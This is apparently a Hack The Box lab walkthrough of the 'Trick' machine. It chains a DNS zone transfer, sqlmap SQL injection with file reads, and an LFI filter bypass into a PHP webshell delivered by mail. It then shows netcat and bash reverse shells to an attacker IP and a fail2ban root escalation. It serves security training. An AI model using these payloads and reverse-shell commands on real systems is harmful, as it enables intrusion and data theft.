---
machineName: Trick
difficulty: Easy
Status: Done
OS: Linux
start_time: 2026-05-03T09:13:00
end_time: 2026-05-03T00:43:00
player_position: "8788"
CVEs:
CWEs:
tools:
  - nmap
  - ffuf
  - ZAP
  - sqlmap
exploited_programs:
  - DNS 
  - Nginx
  - fail2ban
open_ports:
  - "22"
  - "3552"
  - "53"
  - "80"
aliases:
  - SQLi with FILE privilege, allowed to locate a LFI, chained with sending a mail through smtp with malicous code lands first shell -> misconfigured fail2ban privileges, and security group allows to elevate to root
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ca56ef43d636aff7da48a8b484756cfe.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ca56ef43d636aff7da48a8b484756cfe.png"
    width="200"
  >
</div>

# First Enumeration

```sh
nmap -sC -sV -Pn -oX ./Outputs/trick.htb/nmap.xml 10.129.227.180
```

| Port | Proto | Service | Product | Version | Info |
|------|-------|---------|----------|---------|------|
| 22 | tcp | ssh | OpenSSH | 7.9p1 Debian 10+deb10u2 | protocol 2.0 |
| 25 | tcp | smtp |  |  |  |
| 53 | tcp | domain | ISC BIND | 9.11.5-P4-5.1+deb10u7 | Debian Linux |
| 80 | tcp | http | nginx | 1.14.2 |  |

## DNS

We see there’s a DNS server, I checked it just after the page, which didn’t have anything useful.

```sh
➜  Trick [I] : dig @10.129.227.180 -x 10.129.227.180                                                                                   [3/05/26 | 9:17:44]

; <<>> DiG 9.20.22 <<>> @10.129.227.180 -x 10.129.227.180
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56278
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: a108ffe36671a1a5ebbcd20169f6f714856f30647723f571 (good)
;; QUESTION SECTION:
;180.227.129.10.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
180.227.129.10.in-addr.arpa. 604800 IN	PTR	trick.htb.

;; AUTHORITY SECTION:
227.129.10.in-addr.arpa. 604800	IN	NS	trick.htb.

;; ADDITIONAL SECTION:
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1

;; Query time: 19 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (UDP)
;; WHEN: Sun May 03 09:19:48 CEST 2026
;; MSG SIZE  rcvd: 165
```

This resolves the hostname of the ip! and we see it allows a domain transfer, which leaks other subdomains:

```sh
➜  Trick [I] : dig @10.129.227.180 trick.htb AXFR                                                                                      [3/05/26 | 9:00:00]

; <<>> DiG 9.20.22 <<>> @10.129.227.180 trick.htb AXFR
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 15 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; WHEN: Sun May 03 09:22:27 CEST 2026
;; XFR size: 6 records (messages 1, bytes 231)
```

We get a new subdomains:
- preprod-payroll.trick.htb
And a new mail: root@trick.htb , which might come in handy for the smtp server later

## New Subdomain - preprod-payroll.trick.htb
When we visit the new page we see a very simple login page: 

![[images/htb_images/Pasted image 20260503100900.png]]

After playing around with ZAP, I found this code: 

```js
    $('#login-form').submit(function(e){
        e.preventDefault()
        $('#login-form button[type="button"]').attr('disabled',true).html('Logging in...');
        if($(this).find('.alert-danger').length > 0 )
            $(this).find('.alert-danger').remove();
        $.ajax({
            url:'ajax.php?action=login',
            method:'POST',
            data:$(this).serialize(),
            error:err=>{
                console.log(err)
        $('#login-form button[type="button"]').removeAttr('disabled').html('Login');  
            },
            success:function(resp){
                if(resp == 1){
                    location.href ='index.php?page=home';
                }else if(resp == 2){
                    location.href ='voting.php';
                }else{
                    $('#login-form').prepend('<div class="alert alert-danger">Username or password is incorrect.</div>')
                    $('#login-form button[type="button"]').removeAttr('disabled').html('Login');
                }
            }
        })
    })
```

Nothing that jumped to my eyes directly.

After playing around with this request:

```http
POST http://preprod-payroll.trick.htb/ajax.php?action=login HTTP/1.1
host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 26
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=5e1lo94k1kesj70bb310sdm5m6
Priority: u=0

username=tes&password=tes
```

## SQLMap

### Leaking Database

I discovered that the username field was vulnerable to SQL Injection:

```sh
sqlmap -u "http://10.129.227.180/ajax.php?action=login" --data="username=test&password=test" --method=POST -p username,password 
```
```sh
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=test' AND 2656=(SELECT (CASE WHEN (2656=2656) THEN 2656 ELSE (SELECT 5119 UNION SELECT 4970) END))-- NsBq&password=test

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=test' OR (SELECT 6323 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(6323=6323,1))),0x717a717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nNdF&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 6443 FROM (SELECT(SLEEP(5)))cHxl)-- jmeB&password=test
---
```

Then we enumerate databases, as usual:

```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \ 
  --data="username=test&password=test" \
  --method=POST \
  -p username,password \
  --dbs
```
```sh
available databases [2]:
[*] information_schema
[*] payroll_db
```
```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \    
  --data="username=test&password=test" \
  --method=POST \
  -p username,password \
  -D payroll_db --tables
```
```
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+

```
```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \    
  --data="username=test&password=test" \
  --method=POST \
  -p username,password \
  -D payroll_db -T users --columns
```
```sh
Database: payroll_db
Table: users
[8 columns]
+-----------+--------------+
| Column    | Type         |
+-----------+--------------+
| name      | varchar(200) |
| type      | tinyint(1)   |
| address   | text         |
| contact   | text         |
| doctor_id | int(30)      |
| id        | int(30)      |
| password  | varchar(200) |
| username  | varchar(100) |
+-----------+--------------+

```
```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \    
  --data="username=test&password=test" \
  --method=POST \
  -p username,password \
  -D payroll_db -T users -C username, password
```
```sh
+-----------------------+------------+
| password              | username   |
+-----------------------+------------+
| SuperGucciRainbowCake | Enemigosss |
+-----------------------+------------+
```

We’ve got a free password.

Accesing the page we see it is a recruitment managemenet system, and we seems to have an user:

![[images/htb_images/Pasted image 20260503102524.png]]


### Exploiting the FILE privilege of DB

We see that the database user has the `FILE` privilege, which allows for reading files:
```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \                                                  
  --data="username=test&password=test" \
  --method=POST \
  --privileges
```
```sh
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

We test it by trying to read the  `/etc/passwd` file.

```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \                                                  
  --data="username=test&password=test" \
  --method=POST \
  --sql-query="SELECT LOAD_FILE('/etc/passwd');"
```
```
[11:02:20] [INFO] retrieved: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsy...
SELECT LOAD_FILE('/etc/passwd'): 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\ntss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false\ndnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin\npulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false\navahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\nsaned:x:112:121::/var/lib/saned:/usr/sbin/nologin\ncolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\ngeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin\nhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false\nDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false\nsshd:x:118:65534::/run/sshd:/usr/sbin/nologin\npostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin\nbind:x:120:128::/var/cache/bind:/usr/sbin/nologin\nmichael:x:1001:1001::/home/michael:/bin/bash\n'

```

In this mangled output we can see there’s a **michael** user, and we can confirm that no user John exists.

We try to read a bit more about the web server config:

```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \                                                  
  --data="username=test&password=test" \
  --method=POST \ --cookie=PHPSESSID=on31aoto7vt7ush1ktqrlhj6hu \
  --sql-query="SELECT LOAD_FILE('/etc/nginx/nginx.conf');"
```
```
user www-data;
worker_processes auto;
pid /run/nginx.pid;

include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {

    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    # server_tokens off;

    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3
    ssl_prefer_server_ciphers on;

    ##
    # Logging Settings
    ##

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    ##
    # Gzip Settings
    ##

    gzip on;

    # gzip_vary on;
    # gzip_proxied any;
    # gzip_comp_level 6;
    # gzip_buffers 16 8k;
    # gzip_http_version 1.1;
    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    ##
    # Virtual Host Configs
    ##

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}

# Mail server configuration (disabled)
#mail {
#    server {
#        listen     localhost:110;
#        protocol   pop3;
#        proxy      on;
#    }
#
#    server {
#        listen     localhost:143;
#        protocol   imap;
#        proxy      on;
#    }
#}
```

```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \                                                  [3/05/26 | 11:04:48]
  --data="username=test&password=test" \
  --method=POST \ --cookie=PHPSESSID=on31aoto7vt7ush1ktqrlhj6hu \
  --sql-query="SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');"
```
```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    server_name trick.htb;
    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name _;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm.sock;
    }
}


server {
    listen 80;
    listen [::]:80;

    server_name preprod-marketing.trick.htb;

    root /var/www/market;
    index index.php;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
    }
}


server {
    listen 80;
    listen [::]:80;

    server_name preprod-payroll.trick.htb;

    root /var/www/payroll;
    index index.php;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm.sock;
    }
}
```

We see there’s a new subdomain we didn’t have before: `preprod-marketing.trick.htb`

I launched zap automated scan at it but nothing interesting popped, I leaked the `index.php` file here:
```sh
sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \                                                  [3/05/26 | 11:06:25]
  --data="username=test&password=test" \
  --method=POST \ --cookie=PHPSESSID=on31aoto7vt7ush1ktqrlhj6hu \
  --sql-query="SELECT LOAD_FILE('/var/www/market/index.php');"
```
```php
<?php  
$file = $_GET['page'];  
  
if (!isset($file) || ($file == "index.php")) {  
include("/var/www/market/home.html");  
} else {  
include("/var/www/market/" . str_replace("../", "", $file));  
}  
?>
```

Here we clearly have a LFI Inclusion vulnerability

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
<SNIP> Same output as before <SNIP>
```
# First Foothold

At this point we had:
- SQl Injection 
- LFI Inclusion

I connected to the SMTP server using telnet, to verify which uses exist
```sh
➜  Outputs [I] : telnet trick.htb 25                                                                                                  [3/05/26 | 10:27:16]
Trying 10.129.227.180...
Connected to trick.htb.
Escape character is '^]'.
EHLO trick.htb
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250-debian.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
VRFY root
252 2.0.0 root
VRFY michael
252 2.0.0 michael
VRTFY john
502 5.5.2 Error: command not recognized
```

So yeah, now we are sure that the user `michael` exists, and we verified that the `john` user doesn’t.


After fumbling around a bit trying to find useful stuff, I understood the role of the smtp server: to deliver a payload, I sent the following mail: 
```
➜  Outputs [I] : nc trick.htb 25                                                                                                      [3/05/26 | 12:08:40]
helo x
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain
mail from: woodenk
250 2.1.0 Ok
mail to: michael
503 5.5.1 Error: nested MAIL command
rcpt to: michael
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']);?>
.
250 2.0.0 Ok: queued as B75524099C
```

Visiting:

```sh
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=id"
```
```
From woodenk@debian.localdomain Sun May 3 12:11:35 2026 Return-Path: X-Original-To: michael Delivered-To: michael@debian.localdomain Received: from x (unknown [10.10.15.62]) by debian.localdomain (Postfix) with SMTP id B75524099C for ; Sun, 3 May 2026 12:10:46 +0200 (CEST) uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

I was getting some really weird issues, were the files seemed to get corrupted or deleted, but they didn’t execute anymore, at this point I had to restart the machine a few times, and attempt sending various mails.

After a few attempts I managed to get a reverse shell, visiting:
```sh
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=nc%2010.10.15.62%204444%20-e%20/bin/sh"
```

# Second Enumeration

As usual I checked `sudo -l`, which outputted:
```sh
michael@trick:/etc/fail2ban/action.d$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

We also see that we are part of the security group:
```sh
michael@trick:/etc/fail2ban/action.d$ groups
michael security
```

poking around `/etc/fail2ban`, we see that the group `security` has access to the `action.d` folder, which means we can modify certain config files.
```
michael@trick:/etc/fail2ban/action.d$ ls -la /etc/fail2ban/
total 76
drwxr-xr-x   6 root root      4096 May  3 14:45 .
drwxr-xr-x 126 root root     12288 May  3 14:39 ..
drwxrwx---   2 root security  4096 May  3 14:45 action.d
```

the file we are interested in is:
```
-rw-r--r-- 1 root root      1420 May  3 14:45 iptables-multiport.conf
```

We cannot edit the file, as we have only `r` rights,  but we have `rwx` over the `action.d` folder, so we can actually create a new one.
# Privilege Escalation
Here what we do is create the following shell file, in `/tmp/shell.sh:
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.29/1337 0>&1
```

we make it executable with `chmod +x`, and we rewrite `iptabled-multiport.conf`, so that `actionban = /tmp/shell.sh`

we launch the command as super user:
```sh
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

We set up a listener, as usual.
And we spam failed connections attempts, which eventually lands us in a root shell.


```sh
root@trick:/ cat /home/michael/user.txt
7d49d6a014cccaf3292b9ef5d581216f
root@trick:/ cat /root/root.txt
a9d343d46bdcf3205dbe6a4be365fb75
```
___
# Understanding the Attack Chain
Now onto an overview of the complete attack chain, as well as a detailed look into any PoC.
___
### 1. DNS Misconfiguration → Subdomain Discovery
The DNS server allowed **zone transfers (AXFR)**, this leaked internal subdomains: `preprod-payroll.trick.htb`
### 2. SQL Injection → Database Access
The login endpoint (`ajax.php?action=login`) was vulnerable to SQLi, we dumped `Enemigosss`  user credentials, and confirmed the database user had `FILE` privileges.
### 3. FILE Privilege → Arbitrary File Read
Using:
```
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')
```
I extracted:
- A new subdomain: `preprod-marketing.trick.htb`, through nginx config files
- As well as some the `index.php` file of the new subdomain, confirming `LFI`
### 4. LFI in Marketing App & SMTP Abuse

```
include("/var/www/market/" . str_replace("../","",$file));
```
Weak filter (`../` removal by-passable with `....//`)
I gained access to: `/var/mail/michael`, which allowed me to inject payloads into the victim.

I sent a mail to `michael` with the following content:
```
<?php system($_GET['cmd']); ?>
```

Setting up a netcat listener and curling the following url landed us the first shell:
```
curl   http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/mail/michael&cmd=nc%2010.10.15.62%20-e%20/bin/sh
```
### 8. Privilege Escalation via Fail2Ban

Michael was in the `security` group, with a writable directory:
```
/etc/fail2ban/action.d/
```

And also had a sudoable command:

```
sudo /etc/init.d/fail2ban restart
```

 Exploit:
1. Create malicious script
2. Modify action config (`actionban`)
3. Restart fail2ban
4. Trigger ban → script runs as root
# Improving
Things I could have done better
___
### Understanding Weird Resets And One Shot Attempts
Looking back as a root user we can quickly understand why our mails where working for very short periods of time, as well as why the fail2ban config was getting reset, on hindsight, I could have written small scripts to do things faster, mainly the swap of the fail2ban files.

```sh
root@trick: crontab -l
SHELL=/bin/bash
*/2 * * * * rm -rf /var/mail/*
*/3 * * * * /bin/bash /root/f2b.sh
@reboot sleep 15 && /bin/bash /root/set_dns.sh
```
```sh
root@trick: cat f2b.sh

#!/bin/bash

rm -rf /etc/fail2ban/*
cp -r /root/fail2ban /etc/
chown root:security /etc/fail2ban/action.d
chmod 770 /etc/fail2ban/action.d
```
```sh
root@trick:~ cat set_dns.sh
#!/bin/bash

ip=$(hostname -I)
last=$(echo $ip | cut -d "." -f 4 | awk '{print $1;}')
first=$(echo $ip | cut -d "." -f 1)
second=$(echo $ip | cut -d "." -f 2)
third=$(echo $ip | cut -d "." -f 3)

echo ';
; BIND reverse data file for local loopback interface
;
$TTL    604800
@    IN    SOA    trick.htb. root.trick.htb (
                  3        ; Serial
             604800        ; Refresh
              86400        ; Retry
            2419200        ; Expire
             604800 )    ; Negative Cache TTL
;
@    IN    NS    trick.htb.
'$last'    IN    PTR    trick.htb.' > /etc/bind/reverse.trick.htb

echo ';
; BIND data file for local loopback interface
;
$TTL    604800
@    IN    SOA    trick.htb. root.trick.htb. (
                  5        ; Serial
             604800        ; Refresh
              86400        ; Retry
            2419200        ; Expire
             604800 )    ; Negative Cache TTL
;
@    IN    NS    trick.htb.
@    IN    A    127.0.0.1
@    IN    AAAA    ::1
preprod-payroll    IN    CNAME    trick.htb.' > /etc/bind/db.trick.htb

echo 'zone "trick.htb" {
    type master;
    file "/etc/bind/db.trick.htb";
    allow-transfer { any; };
};

zone "'$third'.'$second'.'$first'.in-addr.arpa" {
    type master;
    file "/etc/bind/reverse.trick.htb";
};' > /etc/bind/named.conf.local

systemctl restart bind9
```

### Understanding the Nginx Server structure

Also this is the structure of a nginx server for future reference:

- **nginx.conf** → main Nginx configuration file (entry point)
- **conf.d/** → extra config snippets automatically loaded
- **snippets/** → reusable blocks (e.g., PHP, SSL, security configs))

- **sites-available/** → all defined website configs (inactive or available)
- **sites-enabled/** → active website configs (symlinks from sites-available)

- **fastcgi.conf** → default FastCGI parameter definitions
- **fastcgi_params** → alternative FastCGI variables for PHP/FPM

- **proxy_params** → headers/settings for reverse proxy behavior

- **scgi_params** → config for SCGI applications
- **uwsgi_params** → config for uWSGI (Python apps)

- **modules-available/** → installed but inactive Nginx modules
- **modules-enabled/** → active modules (symlinked)

- **mime.types** → maps file extensions to MIME types
- **koi-utf** → KOI8-R to UTF-8 encoding map
- **koi-win** → KOI8-R to Windows encoding map
- **win-utf** → Windows-1251 to UTF-8 map

### SSH Key enumeration

Also, getting to log the shell of michael would have been way easier if I poked around a bit more for ssh keys, after pwning the machine I attempted visiting:
```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
```

and of course it worked. 
Next time I should be thorough and attempt: 
```
id_rsa
id_dsa
id_ecdsa
id_ed25519
authorized_keys
known_hosts
config
```

# Wasted Time
Things I did that didn’t work
___
At some point ZAP told me there was a CVE, found a poc, and tried exploiting, but no succes.
### PHP Wrappers
I tried things like:
```
php://inputphp://filter
```

Why it didn’t work:
- `allow_url_include = Off`
- LFI was **filesystem-only**, not stream-based
 Lesson:  
Check PHP config early:

```
/etc/php/*/fpm/php.ini
```

### SSH Keys
Tried to get an ssh key, but no success: 
```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_ed25519
```

```sh
root@trick:/var/www/market cat /etc/php/7.3/fpm/php.ini | grep "allow_url" 
allow_url_fopen = On 
allow_url_include = Off
```